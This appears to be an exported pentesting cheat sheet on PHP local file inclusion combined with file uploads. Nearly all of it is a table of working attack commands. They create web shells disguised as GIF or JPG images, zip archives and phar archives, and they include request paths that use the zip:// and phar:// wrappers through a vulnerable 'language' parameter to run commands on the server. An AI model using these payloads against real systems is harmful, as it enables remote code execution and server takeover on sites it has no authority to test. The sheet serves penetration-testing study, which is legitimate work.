# PHP LFI + Upload Examples

OS: PHP, Web
Description: LFI + Upload Techniques
Security Domains: Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)
Target_Technology: php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21)

| **LFI + Upload** |  |
| --- | --- |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Create malicious image |
| `/index.php?language=./profile_images/shell.gif&cmd=id` | RCE with malicious uploaded image |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious zip archive 'as jpg' |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id` | RCE with malicious uploaded zip |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | Create malicious phar 'as jpg' |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | RCE with malicious uploaded phar |